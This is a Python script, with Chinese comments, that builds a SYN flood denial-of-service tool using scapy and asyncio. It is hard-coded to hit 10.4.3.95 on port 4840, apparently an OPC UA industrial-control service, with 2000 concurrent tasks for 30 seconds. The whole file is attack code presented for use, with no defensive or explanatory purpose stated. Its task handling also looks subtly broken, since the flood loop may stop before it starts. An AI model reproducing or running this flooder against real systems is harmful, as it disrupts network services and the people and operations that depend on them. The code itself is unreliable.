import asyncio
from scapy.all import IP, TCP, send
import random

# 全局变量
attack_flag = True
packet_count = 0
failed_count = 0

async def syn_flood(target_ip, target_port, source_ip):
    """
    异步发包函数，用于发送大量 SYN 数据包
    """
    global packet_count, failed_count, attack_flag

    while attack_flag:
        try:
            # 构造 IP 层和 TCP 层
            ip_layer = IP(src=source_ip, dst=target_ip)
            tcp_layer = TCP(
                sport=random.randint(1024, 65535),
                dport=target_port,
                flags='S',
                seq=random.randint(0, 4294967295)
            )
            # 发送包并检查结果
            result = send(ip_layer / tcp_layer, verbose=False)
            packet_count += 1  # 成功发送的包计数
        except Exception as e:
            failed_count += 1  # 失败的包计数
            print(f"Error in sending packet: {e}")

async def attack_manager(target_ip, target_port, source_ip, thread_count, attack_time):
    """
    管理异步任务的函数
    """
    global attack_flag, packet_count, failed_count

    # 设置攻击标志
    attack_flag = True

    # 创建多个任务（相当于并发线程）
    tasks = [syn_flood(target_ip, target_port, source_ip) for _ in range(thread_count)]
    print(f"Started SYN Flood on {target_ip}:{target_port} from source IP {source_ip} with {thread_count} tasks.")
    
    # 等待指定时间后停止攻击
    await asyncio.sleep(attack_time)
    attack_flag = False  # 停止所有发包任务

    # 等待所有任务完成
    await asyncio.gather(*tasks, return_exceptions=True)

    print(f"Attack finished. Total packets sent: {packet_count}, Failed packets: {failed_count}")

def main():
    # 配置攻击参数
    target_ip = "10.4.3.95"
    target_port = 4840
    source_ip = "10.5.0.94"  # 本机IP
    thread_count = 2000  # 异步任务数量
    attack_time = 30  # 攻击持续时间（秒）

    # 运行异步攻击管理器
    asyncio.run(attack_manager(target_ip, target_port, source_ip, thread_count, attack_time))

if __name__ == "__main__":
    main()
